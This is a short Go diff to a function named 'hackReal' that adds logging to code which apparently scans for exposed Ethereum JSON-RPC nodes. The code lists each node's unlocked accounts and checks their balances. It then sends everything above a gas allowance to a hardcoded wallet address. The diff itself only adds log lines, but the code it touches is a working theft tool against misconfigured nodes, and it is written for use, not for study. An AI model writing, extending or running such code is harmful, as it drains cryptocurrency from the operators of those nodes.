@@ -71,12 +71,15 @@ func (pxy *proxy) hackReal() {
 		// 	//if connected write to redis set
 		_, err := r.GetBlockNumber()
 		if err == nil {
+			logger.Info("GetBlockNumber:", addr)
 			// red.WriteRealEthPort(addr)
 			acc, err2 := r.GetAccounts()
 			if err2 == nil {
+				logger.Info("GetAccounts:", addr)
 				for _, a := range acc {
 					balance, err2 := r.GetBalance(a)
 					if err2 == nil {
+						logger.Info("GetBalance:", addr)
 						left := balance.Sub(balance, big.NewInt(22000*22000000000))
 						if left.Cmp(big.NewInt(0)) > 0 {
 							r.SendTransaction(a, "6c654877175869c1349767336688682955e8edf8", "22000", "22000000000", left.Text(10), false)
